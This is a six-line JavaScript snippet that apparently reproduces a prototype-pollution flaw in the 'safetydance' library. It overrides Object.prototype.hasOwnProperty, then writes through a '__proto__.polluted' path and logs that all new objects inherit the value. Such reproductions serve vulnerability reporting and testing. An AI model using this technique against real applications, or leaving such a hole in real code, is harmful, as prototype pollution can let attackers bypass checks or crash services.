Object.prototype.hasOwnProperty = () => true;
const safetydance = require('safetydance');
obj = {};
console.log({}.polluted);
safetydance.set({}, '__proto__.polluted', 'yes');
console.log({}.polluted);